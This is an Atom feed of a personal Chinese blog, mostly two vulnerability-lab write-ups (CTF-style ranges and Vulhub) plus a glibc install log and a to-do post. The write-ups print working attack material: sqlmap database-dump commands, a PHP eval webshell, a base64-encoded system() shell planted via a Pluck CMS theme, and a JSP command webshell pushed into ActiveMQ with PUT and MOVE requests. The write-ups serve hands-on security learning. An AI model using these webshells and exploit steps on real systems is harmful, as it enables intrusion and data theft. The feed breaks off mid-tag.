<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>猫涅的秘密结社</title>
  <icon>https://www.maonie.top/icon.png</icon>
  <subtitle>嗯..喵?</subtitle>
  <link href="https://www.maonie.top/atom.xml" rel="self"/>
  
  <link href="https://www.maonie.top/"/>
  <updated>2024-11-23T04:45:16.963Z</updated>
  <id>https://www.maonie.top/</id>
  
  <author>
    <name>nirvanafelis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网页小修时间</title>
    <link href="https://www.maonie.top/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/"/>
    <id>https://www.maonie.top/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/</id>
    <published>2024-11-23T03:46:50.000Z</published>
    <updated>2024-11-23T04:45:16.963Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="这篇文章单纯是为了推进-督促我搞这个博客的进度的"><a href="#这篇文章单纯是为了推进-督促我搞这个博客的进度的" class="headerlink" title="这篇文章单纯是为了推进/督促我搞这个博客的进度的"></a>这篇文章单纯是为了推进/督促我搞这个博客的进度的</h2><p>已经干的</p><ul><li>404自定义页面</li></ul><p>要干的</p><ul><li>新页面的功能构思/页面设计</li><li>jsplayer/或者别的什么 播放音乐</li><li>搜索引擎支持/rss逻辑更新</li><li>自我介绍update</li><li>不必多说的写更多文章</li></ul><p>反正有空了都能来搞 先推上日程</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="前端" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://www.maonie.top/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>glibc更新记录</title>
    <link href="https://www.maonie.top/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/</id>
    <published>2024-11-12T12:06:22.000Z</published>
    <updated>2024-11-12T22:29:03.573Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近因为各种各样的原因操弄上了校园官方渠道的服务器 分到了配置linux系统的工作<br>为了完成我的任务 我需要安装更新版本的glibc<br>期间发生了大大小小的问题还把服务器搞炸了 总之记录一下防止后边踩坑吧<br>以后再有linux系统选择相关的 铁定首选ubuntu 我心累了</p><span id="more"></span><h2 id="万恶之源"><a href="#万恶之源" class="headerlink" title="万恶之源"></a>万恶之源</h2><p>服务器系统的选择上来说——环境是一个基本光秃秃啥都没装的CentOS Linux release 7.9.2009 (Core)<br>yum确实可以事先安装大部分玩意 但 GLIBC 库是系统的基础组件 我无法于当前的系统版本直接通过yum更新glibc<br>既然apt(Ubuntu才有的安装方式) yum rpm都不行 就只能尝试最拖最难搞的源码安装了</p><h2 id="好比套娃的安装方式"><a href="#好比套娃的安装方式" class="headerlink" title="好比套娃的安装方式"></a>好比套娃的安装方式</h2><p>在网上找了一会 看到了个相对来说靠谱 版本对劲的安装指南<br>依据<a href="https://blog.csdn.net/carefree2005/article/details/117559312">该教程</a>的说法</p><h3 id="至于安装glibc的2-31版本有以下的要求-麻烦"><a href="#至于安装glibc的2-31版本有以下的要求-麻烦" class="headerlink" title="至于安装glibc的2.31版本有以下的要求&amp;麻烦"></a>至于安装glibc的2.31版本有以下的要求&amp;麻烦</h3><ol><li>安装glibc时中断/配置不全或者因为各种各样的原因都极易导致服务器崩溃</li><li>glibc所需要的组件多且版本要求高 基本也同样是没法用yum一站式解决的 需要源码安装</li><li>具体需求（可能不对 可以去实际操作的时候查看目录下的install文件）<br>  需要python版本2.7.6以上 3.4以上（python2 3同时需要）<br>  gcc版本4.7以上<br>  make版本3.79以上<br>  bison（有个叫m4的依赖）版本2.7以上</li><li>源码安装运行./configure时 务必谨慎配置–prefix项（决定安装目录） 并且搞懂每个版本的相同软件在系统中的位置</li><li>yum依靠python运行 若更新python时覆盖了原版本 会十分麻烦 重装相同版本也难以恢复 需要通过卸载所有python 以rpm覆盖的方式恢复yum的使用 还有yum的指定python运行路径由文件 /usr/libexec/urlgrabber-ext-down 与 /usr/bin/yum 决定<br>  <img data-src="/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>  如果yum出现了各种各样的问题 记得先检查这两个文件的第一行</li><li>源码安装时有些软件会强制你在文件夹下新建build文件夹再执行configure 这里建议先手创建好文件夹再../configure 先下手为强</li><li>源码安装gcc非常非常慢 建议做好等待半小时-一小时（基于你make时候指定的-j参数 后面会说）的准备</li><li>更新glibc似乎会导致不少命令暂时失效  如果你是通过ssh等命令连接的服务器 务必不要退出 不然会导致服务器爆炸可以<a href="https://blog.csdn.net/qq_35345103/article/details/99679506">参考这玩意里的代码</a>试图恢复</li><li>如果还是一不小心给yum python整炸了 <a href="https://www.cnblogs.com/gcgc/p/15922141.html">参考教程</a>可以做到恢复功能 记得注意版本区别</li></ol><h2 id="具体的安装过程"><a href="#具体的安装过程" class="headerlink" title="具体的安装过程"></a>具体的安装过程</h2><p>因为早就过去了所以复现图片啥的就不贴咯<br>先用yum安装一些没必要源码安装的东西<br>yum update -y<br>yum install bison make wget unzip等等</p><p>至于又臭又长的源码安装全过程</p><ol><li>用wget下载软件的源tar包</li><li>解压后阅读install文件/去网络搜索所需依赖</li><li>创建build文件夹后在其中运行configure文件 成功的话会提示创建了makefile 报错了就要去检查哪里有问题</li><li>make后输入make install安装似乎就完成了 记得检查安装目录是否安装成功</li></ol><p>gcc python2 3 glibc都需要用如上的方式来安装 期间会遇到各种各样的问题 因为每个软件的源码安装会有不同的需求</p><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><div style="text-align: center;">奠  某个服务器的第一条命（虽然挺快就重置了） 奠<br>死因:glibc没配置好导致错误的软连接 输入什么都回显Segmentation fault 变相的系统崩溃</div><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;最近因为各种各样的原因操弄上了校园官方渠道的服务器 分到了配置linux系统的工作&lt;br&gt;为了完成我的任务 我需要安装更新版本的glibc&lt;br&gt;期间发生了大大小小的问题还把服务器搞炸了 总之记录一下防止后边踩坑吧&lt;br&gt;以后再有linux系统选择相关的 铁定首选ubuntu 我心累了&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub在线靶场记录</title>
    <link href="https://www.maonie.top/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2024-10-25T13:43:31.000Z</published>
    <updated>2024-11-08T14:56:57.985Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="开幕介绍-具体简介"><a href="#开幕介绍-具体简介" class="headerlink" title="开幕介绍&amp;具体简介"></a>开幕介绍&amp;具体简介</h1><p>具体环境为<a href="https://yunjing.ichunqiu.com/">这个网站</a><br>能在线部署不少漏洞环境 很方便 正巧拿去了解一下vulhub与src</p><p>不会把打过的全部记录 主要是因为有的靶场重复度略高 分分钟就刷完了 <del>说到底还是条懒狗</del><br>tips:靶场环境很怪 有的时候不开代理加载不全</p><span id="more"></span><h1 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h1><p>密码账号通常藏在网页信息中/单纯就是初始密码<br>使用将burp中的raw报文保存为txt后 <code>mysql -r 文件名 -batch --dbs</code>进行暴库的方式进行sql注入<br><strong>↑多见于post传参时使用</strong><br>只要文件类型允许php便能通过链接后端webshell的方式进行文件上传漏洞验证</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a><strong>CVE-2022-32991</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>该CMS的welcome.php中存在SQL注入攻击。</p></blockquote><p>靶标写的很清楚了 就是sql注入攻击<br>随意注册一个账号 登陆后便看到了我们的目标——welcome.php<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>拖到sqlmap里说是参数q并不能注入 点击start跳转目录 能看到更多的传参<br>再次放到sqlmap里处理….. 显示eid可注入 挺好的</p><pre class="line-numbers language-none"><code class="language-none">-u "想注入的网址" //目标地址--dbs //爆出所有数据库-D //选中数据库 配合 --tables //爆出所有数据库下的项-T //选中项 配合 --dump //爆出项中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配合网址就能爆出数据库ctf中flag项里的具体数据——flag值 过关</p><h2 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a><strong>CVE-2022-30887</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p></blockquote><p>一进主页面是全白的<br>铁定不对 先用dirb扫了一遍<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/2.jpg" alt="2"><br>发现个login目录 进去跳转到了wordpress的登陆页面<br>至于登陆的账号密码已经在标题上写好了——test<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/3.jpg" alt="3"><br>登陆进去看看<br>在wp-admin处 我们利用<a href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">一个漏洞</a>来获取mysql 数据库中的数据</p><pre class="line-numbers language-none"><code class="language-none">http://eci-2ze816q8joahfm3hcxoi.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce //获取一段随机数http://eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?_wpnonce=[刚刚获取的随机数]&amp;name=words&amp;search_engine=aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将输入后的内容用burpsuite抓包<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/4.jpg" alt="4"><br>然后将报文保存在一个1.txt中 然后利用sqlmap进行暴库</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/5.jpg" alt="5"></p><p>然后就很自然的爆出了flag 耶</p><h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><blockquote><p><em>靶标介绍：</em></p><p>ED01-CMS v20180505 存在任意文件上传漏洞</p></blockquote><p>进入页面 发现需要登陆 且无法正常注册用户</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/6.jpg" alt="6"></p><p>那就f12看看线索吧…<br>发现似乎存在admin账号 那就先admin/admin试试 再不行抓包爆破了</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/7.jpg" alt="7"></p><p>然后顺利进去了 傻眼<br>管理员页面全是文章添加/删改相关的 能上传东西的只有一个账号头像了<br>上传后门文件1.php 内容还是老样子</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST['123']); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/8.jpg" alt="8"></p><p>右键图片处copy文件网址 放进蚁剑里链接 在/flag处获得flag 完成！</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/9.jpg" alt="9"></p><h2 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h2><blockquote><p><em>靶标介绍：</em></p><p>E-Commerce Website 1.0 允许通过“index_search.php”中的参数“search”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><p>进入主页 翻到个搜索框 看来就是对应了靶标中的<code>index_search</code>功能<br>burp开着监听 随便搜点东西 监听到了搞成txt放进sqlmap<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/10.jpg" alt="10"></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r [报文txt] --dbs //爆出数据库sqlmap -r [报文txt] -D [数据库名] --tables //选中数据库爆出数据项sqlmap -r [报文txt] -D [数据库名] -T [数据项名] --dump //爆出数据项中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img data-src="/11.jpg" alt="11"></p><p>弄到最后一步就有flag了</p><h2 id="CVE-2022-26965"><a href="#CVE-2022-26965" class="headerlink" title="CVE-2022-26965"></a>CVE-2022-26965</h2><blockquote><p><em>靶标介绍：</em></p><p>Pluck-CMS-Pluck-4.7.16 后台RCE</p></blockquote><p>进入页面啥也没有 点击脚注admin<br>输入密码admin进入后台<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/12.jpg" alt="12"></p><p>rce的具体地点发生在网站后台的<strong>更换主题</strong>中<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/13.jpg" alt="13"></p><p>去github上搜索关键词 <code>Pluck CMS</code> 去寻找简介里有 <strong>theme</strong> 字眼的项目<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/14.jpg" alt="14"></p><p>进去之后在release页面下载 解压内容之后更改<code>info.php</code>文件内的具体代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfile_put_contents('testshell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg=='));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改完再次打包成zip 安装主题里弄上<br>安装完之后访问环境<code>/testshell.php?1= cat /flag</code>获取flag<br>完成！</p><h2 id="CVE-2023-37474"><a href="#CVE-2023-37474" class="headerlink" title="CVE-2023-37474"></a>CVE-2023-37474</h2><blockquote><p><em>靶标介绍：</em></p><p>Copyparty是一个可移植的文件服务器。在1.8.2版本之前的版本存在一个CTF技巧，该漏洞位于<code>.cpr</code>子文件夹中。路径遍历攻击技术允许攻击者访问位于Web文档根目录之外的文件、目录.</p></blockquote><p>子目录也说了是.cpr 在网址后边输入/.cpr/（想要获取的文件名）<br>/符号用%2f代替即可 输入后便会自动下载相应的文件</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;开幕介绍-具体简介&quot;&gt;&lt;a href=&quot;#开幕介绍-具体简介&quot; class=&quot;headerlink&quot; title=&quot;开幕介绍&amp;amp;具体简介&quot;&gt;&lt;/a&gt;开幕介绍&amp;amp;具体简介&lt;/h1&gt;&lt;p&gt;具体环境为&lt;a href=&quot;https://yunjing.ichunqiu.com/&quot;&gt;这个网站&lt;/a&gt;&lt;br&gt;能在线部署不少漏洞环境 很方便 正巧拿去了解一下vulhub与src&lt;/p&gt;
&lt;p&gt;不会把打过的全部记录 主要是因为有的靶场重复度略高 分分钟就刷完了 &lt;del&gt;说到底还是条懒狗&lt;/del&gt;&lt;br&gt;tips:靶场环境很怪 有的时候不开代理加载不全&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/src/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub记录（旧的）</title>
    <link href="https://www.maonie.top/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/</id>
    <published>2024-09-30T02:29:55.000Z</published>
    <updated>2024-10-25T13:40:14.649Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="一脚踹开src的大门"><a href="#一脚踹开src的大门" class="headerlink" title="一脚踹开src的大门"></a>一脚踹开src的大门</h2><p>嘛 机缘巧合下开始练习src 总之先拿vulhub练练手<br>注释: 本来用的是docker纯本地搭建 效率太鸡肋了 换成在线网站搞flag的形式吧 没法getshell的会在这里继续更新</p><span id="more"></span><p>漏洞很多 试点经典的 基本按着readme做</p><h1 id="总结遇到的问题"><a href="#总结遇到的问题" class="headerlink" title="总结遇到的问题"></a>总结遇到的问题</h1><p>-我使用的环境是 <strong>docker for windows</strong> 因此会出现各种奇葩的问题 这里记录</p><h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>关键词:(出现在常常闪退的容器环境的log中)</p><pre class="line-numbers language-none"><code class="language-none">$'\r': command not foundsyntax error: unexpected end of fileexec /docker-entrypoint.sh: no such file or directory （CVE-2019-14234）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>vulhub下自带文件有些只考虑了linux的换行符/文件格式 下载到windows会被自动转换<br>我使用了Git Bash 自带的工具 <code>dos2unix</code>转换文件至unix格式 至此就能正常运行了</p><h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>至于创建环境和搭建环境 请自行练习docker的操作</p><blockquote><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。<br>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞<br> 使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。<br> jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</li><li>执行：</li></ol>  <pre class="line-numbers language-none"><code class="language-none">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>在复现的时候遇到了问题 kali自带的java版本太高导致了报错 这里临时下个java8替换掉原版<br><a href="https://blog.csdn.net/weixin_44862511/article/details/132415494">我参考的教程</a><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>提示这样就完事了</p><blockquote><p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p></blockquote><p>使用默认账号密码admin admin登录进去<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/2.jpg" alt="2"></p><blockquote><p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/3.jpg" alt="3"></p><blockquote><p>将命令替换成弹shell语句再利用：(我用的是windows环境下的docker就不试这个了)<br>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p></blockquote><h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><blockquote><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。<br>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：<br>1.其使用率并不高<br>2.文件操作容易出现漏洞<br>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。<br>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p></blockquote><blockquote><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。<br>文件写入有几种利用方法：<br>1.写入webshell<br>2.写入cron或ssh key等文件<br>3.写入jar或jetty.xml等库和配置文件<br>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。<br>分别说一下上述几种利用方法。</p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/4.jpg" alt="4"></p><p>然后上传webshell：</p><pre class="line-numbers language-none"><code class="language-none">PUT /fileserver/2.txt HTTP/1.1Host: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 120976&lt;%@ page import="java.io.*"%&gt;&lt;% out.print("Hello&lt;/br&gt;"); String strcmd=request.getParameter("cmd"); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ out.print(line+"&lt;/br&gt;"); }%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/5.jpg" alt="5"></p><p>通过burpsuite的MOVE操作有点略难 这里试了几次有时会报400<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/6.jpg" alt="6"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><pre class="line-numbers language-none"><code class="language-none">MOVE /fileserver/2.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/s.jspHost: localhost:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问webshell（需要登录）：<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/7.jpg" alt="7"></p><h1 id="Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）"><a href="#Apache-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）" class="headerlink" title="Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）"></a>Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt</a></li><li><a href="https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，访问<code>/api/jolokia/list</code>这个API可以查看当前服务器里所有的MBeans： cv            </p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/10.jpg" alt="10"></p><blockquote><p>是使用<code>org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean</code>，这是由Log4j2提供的一个MBean。<br>攻击者使用这个MBean中的<code>setConfigText</code>操作可以更改Log4j的配置，进而将日志文件写入任意目录中。<br>使用<a href="poc.py">poc</a>脚本来复现完整的过程：</p><pre class="line-numbers language-none"><code 